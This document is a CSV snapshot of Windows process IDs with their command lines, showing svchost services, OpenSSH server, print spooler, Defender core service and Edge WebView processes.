PID,Args
2256,C:\\WINDOWS\\system32\\svchost.exe -k WebThreatDefense -p -s webthreatdefsvc
2272,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s LanmanServer
2324,C:\\WINDOWS\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p
2352,C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceHttp -p
2368,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --no-startup-window"
2416,C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceAndNoImpersonation -p -s SSDPSRV
2424,C:\\WINDOWS\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s TextInputManagementService
2456,C:\\WINDOWS\\System32\\OpenSSH\\sshd.exe
2468,C:\\WINDOWS\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p -s DusmSvc
2476,C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p -s Wcmsvc
2548,C:\\WINDOWS\\System32\\svchost.exe -k netsvcs -p -s ShellHWDetection
2624,C:\\WINDOWS\\system32\\svchost.exe -k appmodel -p -s StateRepository
2636,C:\\WINDOWS\\system32\\SearchIndexer.exe /Embedding
2676,C:\\WINDOWS\\System32\\spoolsv.exe
2716,C:\\WINDOWS\\System32\\svchost.exe -k netsvcs -p -s BITS
2752,C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNoNetworkFirewall -p
2776,C:\\WINDOWS\\System32\\svchost.exe -k NetworkService -p -s LanmanWorkstation
2856,"""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25110.6-0\\MpDefenderCoreService.exe"""
2928,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=gpu-process --noerrdialogs --user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.18.9.23723; 10.0.0.0.26100.7462) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.26100 IsWebView2/True (WebView2Version 143.0.3650.96)"" --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=SearchHost.exe --webview-exe-version=2125.30600.0.0 --embedded-browser-webview=1 --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1720,i,13281122216751733724,12550217489002156419,262144 --field-trial-handle=2016,i,14908420433272789986,11771142321928041056,262144 --enable-features=msEdgeFluentOverlayScrollbar --disable-features=msSmartScreenProtection --variations-seed-version --trace-process-track-uuid=3190708988185955192 --mojo-platform-channel-handle=2020 /prefetch:2 /pfhostedapp:fc3b6dc26ff9858eea25d915469c990c41f4779f"
2960,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=525.31002.10.0 --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\\LocalState\\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --lang=en-US --mojo-named-platform-channel-pipe=8064.1436.12564641940516956223 /pfhostedapp:1f3d0ca33106b1de2a6f2986b70740d61f4ac3d5"
